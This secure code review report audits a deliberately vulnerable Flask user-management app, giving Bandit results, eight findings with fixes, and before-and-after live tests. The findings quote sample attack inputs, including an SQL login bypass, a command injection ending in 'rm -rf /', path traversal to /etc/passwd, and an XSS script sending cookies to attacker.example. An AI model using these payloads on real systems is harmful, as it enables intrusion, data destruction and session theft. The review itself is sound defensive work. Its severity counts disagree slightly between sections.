# Secure Coding Review Report

**Application audited:** VulnBank — Flask user-management web app
**Language:** Python 3 (Flask)
**Files:** `vulnerable_app.py` (audit target) → `secure_app.py` (remediated)
**Tools used:** Bandit v1.9.4 (static analysis) + manual source review
**Date:** 2026-07-19

---

## 1. Executive Summary

A secure code review was performed on a small Flask-based user-management application (login, registration, search, ping, file download, and session-loading endpoints). The review combined automated static analysis (Bandit) with manual line-by-line inspection.

**8 vulnerabilities** were identified, spanning **3 Critical/High-impact injection and deserialization flaws**, **3 High-severity flaws** (weak hashing, hardcoded secret, command injection), and **2 Medium/config-level issues**. All 8 have been remediated in `secure_app.py`, which was re-scanned to confirm the fixes.

| Severity | Count |
|---|---|
| Critical | 3 |
| High | 3 |
| Medium | 2 |

---

## 2. Scope & Methodology

1. **Static analysis** — ran Bandit against `vulnerable_app.py`:
   ```
   bandit -r vulnerable_app.py -f txt
   ```
2. **Manual inspection** — traced every user-controlled input (`request.form`, `request.args`, raw request body) to its sink (database call, shell call, template, filesystem call, deserializer) to catch logic-level issues static analysis alone tends to miss.
3. **Remediation** — rewrote the application as `secure_app.py`, then re-ran Bandit to confirm each finding was resolved.

---

## 3. Static Analysis Results (Bandit)

Bandit's automated pass on `vulnerable_app.py` flagged **8 issues** (2 Low, 3 Medium, 3 High by its own severity scale):

| Bandit ID | Issue | Bandit Severity | Line |
|---|---|---|---|
| B403 | `pickle` import | Low | 14 |
| B105 | Hardcoded password/secret string | Low | 18 |
| B608 | SQL built via string concatenation | Medium (Low confidence) | 42 |
| B324 | Weak MD5 hash for security purposes | High | 58 |
| B605 | Process started with shell=True | High | 78 |
| B301 | Untrusted `pickle.loads()` | Medium | 93 |
| B201 | Flask `debug=True` | High | 99 |
| B104 | Binding to all interfaces (`0.0.0.0`) | Medium | 99 |

**Note on tool limits:** Bandit flagged the SQL injection at only *Low confidence* (it can't always tell string-built SQL from safe string-building), and it did **not** flag the reflected XSS in `/search` or the path traversal in `/download` at all — those two require understanding *where the string ends up* (an HTML response, a filesystem path), which is exactly what the manual review pass in Section 4 is for. This is the core justification for pairing a static analyzer with manual review rather than relying on either alone.

---

## 4. Detailed Findings

### VULN-01 — SQL Injection (Critical)
- **CWE-89** · `login()`, line 42
- User-supplied `username`/`password` are concatenated directly into a SQL string. An attacker can submit `' OR '1'='1` to bypass authentication entirely, or extract arbitrary data.
- **Remediation:** use parameterized queries — `conn.execute("SELECT ... WHERE username = ?", (username,))`. Never build SQL by string concatenation or f-string with user input.

### VULN-02 — OS Command Injection (Critical)
- **CWE-78** · `ping()`, line 78
- `host` is concatenated into a string passed to `os.system()`. Input like `8.8.8.8; rm -rf /` executes arbitrary shell commands.
- **Remediation:** validate `host` against a strict allow-list pattern, and call `subprocess.run([...])` with a list of arguments (no shell) instead of a shell string.

### VULN-03 — Insecure Deserialization (Critical)
- **CWE-502** · `load_session()`, line 93
- `pickle.loads()` on raw, unauthenticated request data allows arbitrary code execution — pickle can be crafted to run any Python object's `__reduce__` method on load.
- **Remediation:** never deserialize untrusted pickle data. Remove the endpoint, or replace it with signed/structured data (JSON + a library like `itsdangerous`) if cross-request state is genuinely needed.

### VULN-04 — Hardcoded Secret Key (High)
- **CWE-798** · module level, line 18
- `app.secret_key` is a fixed literal committed to source. Anyone with source access (or who guesses it) can forge session cookies.
- **Remediation:** generate the key with `secrets.token_hex(32)` and load it from an environment variable or secrets manager — never commit it to source control.

### VULN-05 — Reflected Cross-Site Scripting (High)
- **CWE-79** · `login()` line 46, `search()` line 66
- Both endpoints reflect raw user input into an HTML response with no escaping. A payload like `<script>document.location='https://attacker.example/'+document.cookie</script>` executes in the victim's browser.
- **Remediation:** escape all user-controlled output (`markupsafe.escape()`), and prefer Jinja's autoescaping `render_template()` over hand-built HTML strings or `render_template_string()`.

### VULN-06 — Weak Password Hashing (High)
- **CWE-327** · `register()`, line 58
- Passwords are hashed with unsalted MD5, which is fast to brute-force and vulnerable to rainbow-table attacks.
- **Remediation:** use a slow, salted algorithm designed for passwords — `werkzeug.security.generate_password_hash()` (PBKDF2) or `bcrypt`/`argon2`.

### VULN-07 — Path Traversal (High)
- **CWE-22** · `download()`, line 86
- The `file` parameter is appended directly to a base path with no sanitization. A request like `?file=../../etc/passwd` can read arbitrary files off the server.
- **Remediation:** sanitize with `werkzeug.utils.secure_filename()`, resolve the final path, and verify it stays inside the intended directory before serving it (`send_from_directory`).

### VULN-08 — Insecure Deployment Configuration (Medium)
- **CWE-16 / CWE-605** · `app.run(...)`, line 99
- `debug=True` exposes the interactive Werkzeug debugger, which allows arbitrary remote code execution if reached. `host="0.0.0.0"` exposes the dev server to every network interface.
- **Remediation:** `debug=False` in anything beyond local development; bind to `127.0.0.1` and serve through a production WSGI server (gunicorn/uWSGI) behind a reverse proxy.

---

## 5. Post-Remediation Verification

Re-running Bandit against `secure_app.py` after remediation:

| Severity | Before | After |
|---|---|---|
| High | 3 | 0 |
| Medium | 3 | 0 |
| Low | 2 | 3* |

\*The 3 remaining Low findings are Bandit noting that `subprocess` is imported and used at all (B404/B603/B607) — expected, since the `/ping` feature still needs to run a system command. The risk is mitigated by the allow-list input validation added in `secure_app.py`. As an optional hardening step, the executable could be referenced by its full path (e.g. `/bin/ping`) to silence B607 and remove any reliance on `$PATH`.

---

## 6. Live Validation

Both applications were actually run and tested end-to-end (not just statically reviewed) to confirm real impact and real fixes.

**Against `vulnerable_app.py`:**
| Attack | Result |
|---|---|
| `' OR '1'='1' --` login payload | Authentication bypassed — logged in as `admin` with no valid password |
| `<script>alert(1)</script>` via `/search` | Reflected back verbatim, unescaped, in the HTML response |
| `127.0.0.1; echo INJECTED_COMMAND_RAN` via `/ping` | Confirmed via server log: the injected `echo` command executed on the host |
| `../secret.txt` via `/download` | Successfully read a file outside the intended `uploads/` directory |
| `/register` | Password stored as raw MD5 (e.g. `7619c1c6c96b633cec8ce4a1a23e6a9b`) |

**Against `secure_app.py`, same payloads:**
| Attack | Result |
|---|---|
| Same SQL injection payload | Rejected — `Invalid credentials` |
| Same XSS payload | Rendered as inert escaped text: `&lt;script&gt;alert(1)&lt;/script&gt;` |
| Same command injection payload | Rejected — `400 Bad Request: Invalid host` |
| Same path traversal payload | Rejected — `404 Not Found` |
| `/register` | Password stored as a salted `scrypt` hash, not reversible MD5 |

**One refinement made during testing:** the first draft of the `/search` fix built the response as `"<h1>...</h1>" + escape(name)`. Live testing showed `markupsafe`'s `Markup` type escapes *both* operands when a plain string is added to it — so the trusted `<h1>` wrapper was being escaped along with the untrusted input, breaking the intended markup. The fix was changed to `Markup("<h1>Results for: {}</h1>").format(name)`, which escapes only the interpolated value and leaves the trusted template intact. Confirmed working on re-test.

---

## 7. General Secure Coding Recommendations

1. **Treat all input as hostile** — form data, query strings, headers, and request bodies alike — until validated or sanitized.
2. **Use parameterized queries / ORMs** for every database call; never build queries by string concatenation.
3. **Never invoke a shell with user input.** Use list-form `subprocess` calls and allow-list validation for anything that must run an external command.
4. **Hash passwords with a purpose-built algorithm** (bcrypt, scrypt, argon2, or PBKDF2 via Werkzeug) — never a fast general-purpose hash like MD5 or SHA-1.
5. **Escape all output** rendered into HTML, and prefer templating engines with autoescaping enabled by default over hand-built strings.
6. **Never deserialize untrusted data with `pickle`** (or similar). Prefer JSON, and sign/verify any data that crosses a trust boundary.
7. **Keep secrets out of source control** — load them from environment variables or a secrets manager, and rotate them if ever exposed.
8. **Validate and confine file paths** for any feature that reads or writes files based on user input.
9. **Disable debug mode and restrict bind addresses** before anything leaves local development.
10. **Run both a static analyzer and a manual review** — each catches classes of bugs the other misses.

---

## 8. Conclusion

All 8 findings identified in `vulnerable_app.py` were remediated in `secure_app.py` and confirmed via a Bandit re-scan (0 Medium/High findings remaining). The application should not be considered production-ready on the basis of this review alone — a full audit would also cover authentication/session management end-to-end, rate limiting, dependency vulnerabilities, and logging/monitoring — but the vulnerability classes covered here represent the most common and highest-impact issues found in real-world Flask applications.
